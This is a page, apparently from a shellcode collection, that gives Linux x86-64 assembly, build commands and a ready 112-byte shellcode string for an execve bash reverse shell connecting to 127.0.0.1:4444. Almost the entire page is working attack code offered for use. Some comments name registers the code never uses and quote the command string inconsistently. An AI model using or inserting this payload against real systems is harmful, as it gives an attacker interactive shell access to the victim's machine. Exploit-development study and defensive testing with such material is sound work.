---
layout: default
title: Execve bash Reverse Shell (127.0.0.1:4444)
permalink: /shellcode/asm-25.html
os: Linux
arch: Intel x86-64
length: 112
---

# {{ page.title }}

---
**OS:** {{ page.os }}

**Architecture:** {{ page.arch }}

**Length:** {{ page.length }} bytes

---

## Assembly

```nasm
section .text
global _start

_start:
	xor ebx, ebx				; RBX = 0
	xor ecx, ecx				; RCX = 0 (on x86-64 writing to a 32-bit register extends to the full 64-bit register)
	mul ebx					; RAX, RDX = 0

	push rdx				; Push null terminator
	mov rdx, 0x31263e302031263e	        ; ">&1 0>&1"
	push rdx
	mov rdx, 0x3220343434342f31	        ; "1/4444 2"
	push rdx
	mov rdx, 0x2e302e302e373231	        ; "127.0.0."
	push rdx
	mov rdx, 0x2f7063742f766564	        ; "dev/tcp/"
	push rdx
	mov rdx, 0x2f3e20692d206873	        ; "sh -i >/"
	push rdx
	mov rdx, 0x61622f2f6e69622f	        ; "/bin//ba"
	push rdx
	mov rdx, rsp				; R12 -> "/bin//bash -i >/dev/tcp/127.0.0.1/4444 2>&1 0>&1"

	push rbx				; Push null terminator
	mov bx, 0x632d				; Move "-c" into RBX
	push rbx
	mov rbx, rsp				; R13 -> "-c"

	push rax				; Push null terminator
	mov rcx, 0x68732f2f6e69622f	        ; Move "/bin//sh" into RBX
	push rcx
	mov rdi, rsp				; RDI -> "/bin//sh"

	push rax				; Push null terminator
	push rdx				; Push "/bin/////bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
	push rbx				; Push "-c"
	push rdi				; Push "/bin//sh"
	mov rsi, rsp				; RSI -> {"/bin//sh", "-c", "/bin/////bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"}

	mov al, 0x3b				; Move 0x3b into RAX (execve syscall number)
	cdq					; RDX = 0
	syscall					; Execute execve
```

## Compilation and Linking

```bash
# Assemble
nasm -f elf64 -o code.o code.asm

# Link
ld -m elf_x86_64 -s -o code code.o

# Extract Shellcode
printf '\\x' && objdump -d code | grep "^ " | cut -f2 | tr -d ' ' | tr -d '\n' | sed 's/.\{2\}/&\\x /g'| head -c-3 | tr -d ' ' && echo ' '
```

## Shellcode

```
\x31\xdb\x31\xc9\xf7\xe3\x52\x48\xba\x3e\x26\x31\x20\x30\x3e\x26\x31\x52\x48\xba\x31\x2f\x34\x34\x34\x34\x20\x32\x52\x48\xba\x31\x32\x37\x2e\x30\x2e\x30\x2e\x52\x48\xba\x64\x65\x76\x2f\x74\x63\x70\x2f\x52\x48\xba\x73\x68\x20\x2d\x69\x20\x3e\x2f\x52\x48\xba\x2f\x62\x69\x6e\x2f\x2f\x62\x61\x52\x48\x89\xe2\x53\x66\xbb\x2d\x63\x53\x48\x89\xe3\x50\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x51\x48\x89\xe7\x50\x52\x53\x57\x48\x89\xe6\xb0\x3b\x99\x0f\x05
```